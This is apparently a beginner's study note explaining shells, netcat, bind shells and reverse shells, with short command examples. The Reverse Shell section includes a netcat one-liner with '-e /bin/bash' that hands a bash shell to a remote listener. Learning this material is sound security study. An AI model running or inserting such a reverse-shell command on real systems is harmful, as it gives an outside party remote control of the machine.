---
tags:
  - shell
  - RevShell
  - netcat
  - nc
---
# Shells and Tools

***The shell is the piece of software that translates the processes into the system by just a simple command system. The shells are like: `PowerShell` and `Bash`***

## Tools can be used to make shells

The Shells is a great utility on the system, but if a hacker owned one on your system you would be in a great danger.

**Owning** a shell on a machine to remotely execute code with high privileges might be if it isn't the highest thing a hacker could make on a machine, it can be done by tools opens the connection to a command executing shell on the machine.


### `Netcat`

`Netcat` is the classic one to create shells. The shells can be created by executing a command on both sides to establish the connection.

Let's say i want to connect to a shell on a machine the IP of it is `10.0.0.1`, first i must make it opens a port to send my request and even make the machine wait my request on, which can be done by executing this command on the other side machine -which is called a listener- :
```bash
nc -lvnp 69
```

Now I must make a request from my side to connect to this machine on the waiting port:
```bash
nc 10.0.0.1 69
```

The meaning of the flags:
- **-l** is used to tell `netcat` that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells `netcat` not to resolve host names or use `DNS`.
- **-p** indicates that the port specification will follow.
### Other tools

There are other tools like `metasploit` and `msvenom` which you can make connection with but with different methods.

___
# Shell Types

***There are mainly two types of shells:***
## Bind Shell

**The bind shell** is to put a listener on the machine, opening a port for you to make the request from your side and connect.

Putting the listener:
```bash
nc -lvnp 69
```

Connecting the open port:
```bash
nc 10.0.0.1 69
```
and it's done

## Reverse Shell

The reverse shell is totally the opposite of the bind shell, your side would be the listener side and the other side would be one who is making the request to give you the connection!!

opening a listener on your side: 
```bash
nc -lvnp 69
```

Now make the other side give you the connection:
```bash
nc 10.0.0.1 69 -e "/bin/bash"
```

and it's done

##### There also the interactive and non-interactive shells and the difference between them is that the interactive can take user inputs the non is not, and most of the bind and reverse shells are non-interactive.

---
